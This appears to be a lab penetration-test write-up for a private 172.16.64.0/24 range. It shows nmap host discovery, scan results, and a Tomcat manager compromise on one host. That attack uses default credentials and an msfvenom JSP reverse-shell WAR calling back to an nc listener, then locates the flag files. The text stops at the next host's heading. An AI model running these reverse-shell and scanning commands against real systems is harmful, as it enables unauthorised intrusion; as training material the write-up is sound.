---
description: >-
  You have been engaged in a Black-box Penetration Test (172.16.64.0/24 range).
  Your goal is to read the flag file on each machine.
---

# Black Box Penetration Test 1

### Discover live hosts on the network

```bash
sudo nmap -sn 172.16.64.0/24 --exclude 172.16.64.10 -oN hostAlive.nmap
cat hostAlive.nmap | grep for | awk {'print $5'} > ips.txt
sudo nmap -sV -n -v -Pn -p- -T4 -iL ips.txt -A --open -oG portScan.grep
```

#### Nmap options

* `-sV` for version identification 
* `-n` for disabling reverse DNS lookup 
* `-v` for Verbose 
* `-Pn` to assume the host is alive 
* `-p-` to scan all the ports 
* `-T4` to speed things up 
* `-iL` to use a list of IPs as input \(ips.txt\) 
* `--open` to see just open ports and not closed / filtered ones 
* `-A` for detailed information and running some scripts

#### Hosts Alive

| Host | OS |
| :--- | :--- |
| 172.16.64.101 | Linux |
| 172.16.64.140 | Linux |
| 172.16.64.182 | Linux |
| 172.16.64.199 | Windows |

### Open Ports and Running Services

####  172.16.64.101

| Port Number | Service | Version |
| :--- | :--- | :--- |
| 22 | ssh | OpenSSH 7.2p2 |
| 8080 | http | Apache Tomcat/Coyote JSP engine 1.1 |
| 9080 | http | Apache Tomcat/Coyote JSP engine 1.1 |

#### 172.16.64.140

| Port Number | Service | Version |
| :--- | :--- | :--- |
| 80 | http | Apache httpd 2.4.18 |

#### 172.16.64.182

| Port Number | Service | Version |
| :--- | :--- | :--- |
| 22 | ssh | OpenSSH 7.2p2 |

#### 172.16.64.199

| Port Number | Service | Version |
| :--- | :--- | :--- |
| 135 | msrpc | Microsoft Windows RPC |
| 139 | netbios-ssn | Microsoft Windows netbios-ssn |
| 445 | microsoft-ds |  |
| 1433 | ms-sql-s | Microsoft SQL Server 2014 |

### Machines

#### 172.16.64.101

Apache Tomcat has [http://172.16.64.101:8080/manager/html](http://172.16.64.101:8080/manager/html) as a management url. In case your authentication fail several times, a 401 page is presented, with a default username and password:

![](../../../../.gitbook/assets/image.png)

```bash
# Terminal 1
nc -l -p 8080

# Terminal 2
msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.64.10 LPORT=8080 -f war -o revshell.war

# 1. Upload to http://172.16.64.10/manager/html
# 2. Open the suggested url in your browser to execute the reverse shell
# 3. Go to your opened nc listener on Terminal one and execute:
find / | grep flag.txt
/home/developer/flag.txt
/home/adminels/Desktop/flag.txt

# Your results should be something like:
cat /home/developer/flag.txt
Congratulations, you got it!
cat /home/adminels/Desktop/flag.txt
You did it!
```

#### 172.16.64.140









